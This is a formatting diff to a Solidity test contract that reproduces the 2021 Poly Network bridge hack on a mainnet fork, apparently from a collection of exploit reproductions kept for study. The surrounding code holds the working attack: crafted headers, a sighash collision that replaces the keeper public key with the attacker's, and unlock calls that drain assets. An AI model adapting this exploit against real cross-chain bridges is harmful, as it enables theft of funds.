@@ -46,7 +46,7 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         hex"0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401";
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 12996658);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 12_996_658);
         // We use the actual attacker address here to reuse their signed message
         // A possible improvement is to reverse-engineer their payload, and create
         // logic that rebuilds the payload to be able to modify it and set
@@ -107,7 +107,7 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         header.prevBlockHash = 0x8446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708; // prevBlockHash
         header.transactionsRoot = 0xd38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a; // transactionsRoot
         header.crossStatesRoot = 0x773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717; // crossStatesRoot
-            // - to verify inclusion
+        // - to verify inclusion
         header.blockRoot = 0xf3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834b; // blockRoot
         header.timestamp = uint32(1_628_587_975); // Aug 10 2021, 6:32:55AM
         header.height = uint32(11_025_028); // height
@@ -120,17 +120,17 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         toMerkleValue.fromChainID = 3;
         // VerifyHeaderAndExecuteTxEvent(tx.makeTxParam.toContract, tx.txHash, tx.makeTxParam.txHash)
         toMerkleValue.txHash = hex"80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a"; // cross-chain
-            // tx hash
+        // tx hash
         toMerkleValue.makeTxParam.txHash =
-            hex"0c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f7"; // source-chain tx hash
+        hex"0c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f7"; // source-chain tx hash
         toMerkleValue.makeTxParam.crossChainId = ZeroCopySink.WriteUint64(12_778);
         toMerkleValue.makeTxParam.fromContract = hex"e1a18842891f8e82a5e6e5ad0a06d8448fe2f407";
         toMerkleValue.makeTxParam.toChainId = uint64(2); // ETH mainnet
         toMerkleValue.makeTxParam.toContract = hex"cf2afe102057ba5c16f899271045a0a37fcb10f2"; // https://etherscan.io/address/0xcf2afe102057ba5c16f899271045a0a37fcb10f2
         toMerkleValue.makeTxParam.method = "f1121318093"; // sighash('f1121318093(bytes,bytes,uint64)') <->
-            // sighash'putCurEpochConPubKeyBytes(bytes)'
+        // sighash'putCurEpochConPubKeyBytes(bytes)'
         toMerkleValue.makeTxParam.args = hex"010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b"; // attacker
-            // pub key
+        // pub key
 
         toMerkleValueBs = serializer.serializeTx(toMerkleValue, toMerkleValue.makeTxParam);
         proof = encodeProof(toMerkleValueBs, auditPath);
@@ -159,7 +159,7 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         header.prevBlockHash = 0x0000000000000000000000000000000000000000000000000000000000000000; // prevBlockHash
         header.transactionsRoot = 0x0000000000000000000000000000000000000000000000000000000000000000; // transactionsRoot
         header.crossStatesRoot = 0xafc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac9; // crossStatesRoot
-            // - to verify inclusion
+        // - to verify inclusion
         header.blockRoot = 0x0000000000000000000000000000000000000000000000000000000000000000; // blockRoot
         header.timestamp = uint32(0); // Aug 10 2021, 6:32:55AM
         header.height = uint32(1_000_000_000); // height
@@ -172,17 +172,17 @@ contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
         toMerkleValue.fromChainID = 10;
         // VerifyHeaderAndExecuteTxEvent(tx.makeTxParam.toContract, tx.txHash, tx.makeTxParam.txHash)
         toMerkleValue.txHash = hex"94821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd"; // cross-chain
-            // tx hash
+        // tx hash
         toMerkleValue.makeTxParam.txHash = hex"00"; // source-chain tx hash
         toMerkleValue.makeTxParam.crossChainId = hex"00";
         toMerkleValue.makeTxParam.fromContract = hex"34d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430";
         toMerkleValue.makeTxParam.toChainId = uint64(2); // ETH mainnet
         toMerkleValue.makeTxParam.toContract = hex"250e76987d838a75310c34bf422ea9f1ac4cc906"; // https://etherscan.io/address/0x250e76987d838a75310c34bf422ea9f1ac4cc906#code#L1304
         toMerkleValue.makeTxParam.method = "unlock"; // function unlock(bytes memory argsBs, bytes memory
-            // fromContractAddr, uint64 fromChainId)
+        // fromContractAddr, uint64 fromChainId)
         toMerkleValue.makeTxParam.args =
             hex"14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000"; // attacker
-            // contract, value etc.
+        // contract, value etc.
 
         toMerkleValueBs = serializer.serializeTx(toMerkleValue, toMerkleValue.makeTxParam);
         proof = encodeProof(toMerkleValueBs, "");
